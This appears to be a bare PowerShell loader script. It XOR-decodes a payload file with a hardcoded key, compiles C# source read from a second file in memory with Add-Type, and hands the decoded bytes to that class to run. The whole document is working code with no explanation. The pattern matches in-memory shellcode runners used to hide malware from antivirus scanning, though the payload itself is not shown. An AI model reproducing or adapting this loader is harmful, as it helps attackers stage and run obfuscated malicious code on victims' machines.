$data = [system.io.file]::readallbytes('byte.dat')
[byte[]] $xor = 0x12,0x45,0x32,0x41,0x21,0x89,0x21,0x71
$j=0
for($i=0;$i -lt $data.count;$i++){
	$data[$i] = $data[$i] -bxor $xor[$j];
	$j+=1;
	if ($j -ge $xor.count){
		$j = 0;
	}
}
#$data | sc -enc byte byte.dat
$class = [system.io.file]::readallbytes('class.txt')
$classstr=[Text.Encoding]::UTF8.GetString($class)
add-type -typedefinition $classstr
[Test]::start($data)
